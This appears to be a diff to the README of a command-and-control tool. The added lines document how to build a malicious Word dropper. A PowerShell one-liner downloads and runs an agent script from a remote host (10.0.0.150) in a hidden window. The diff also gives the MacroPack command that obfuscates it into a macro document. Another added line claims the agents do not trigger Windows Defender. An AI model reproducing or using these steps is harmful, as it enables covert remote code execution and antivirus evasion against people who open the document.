@@ -41,7 +41,11 @@ In the DropperStuff folder i was able to create word doc that ran the following 
 ```
 IEX(New-Object Net.WebClient).downloadString('http://10.0.0.150/Agent.ps1') 
 ```
-I came across [MacroPack](https://github.com/sevagas/macro_pack) which creates and obfuscates dropper files for you go ahead and check it out is pretty awesome. That in conjunction with [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) is a great combo.
+I came across [MacroPack](https://github.com/sevagas/macro_pack) which creates and obfuscates dropper files for you go ahead and check it out is pretty awesome. That in conjunction with [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) is a great combo. Below is command i used in macropack specifically.
+
+```
+echo "powershell.exe -windowstyle Hidden -c IEX(New-Object Net.WebClient).downloadString('http://10.0.0.150/Agent.ps1') -WindowStyle Hidden" | macro_pack.exe -t CMD -o -G  cmd.doc
+```
 
 ## Creating Agents
 
@@ -63,7 +67,8 @@ export_json /tmp/json_output.txt
 
 ![](https://github.com/latortuga71/Black_Tabby/blob/master/setup3.JPG)
 
-## 
+## Does it trigger antivirus
+No as far as i know the powershell and c# agents themselves dont trigger defender.
 
 
 ## Built With
